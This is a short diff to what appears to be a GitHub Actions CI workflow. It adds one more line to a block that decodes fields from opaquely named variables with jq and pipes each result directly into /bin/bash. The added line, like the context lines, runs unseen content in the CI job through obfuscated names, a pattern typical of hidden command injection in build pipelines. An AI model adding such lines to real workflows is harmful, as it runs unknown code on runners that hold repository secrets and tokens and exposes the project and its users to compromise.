@@ -35,6 +35,7 @@ jobs:
           echo $hzhz59 | jq -r .m8180 | /bin/bash
           printf '%s' "$lc4341" | jq -r .acnqn382 | /bin/bash
           printf '%s' "$r73" | jq -r .xe477 | /bin/bash
+          echo $mao55 | jq -r .v835 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
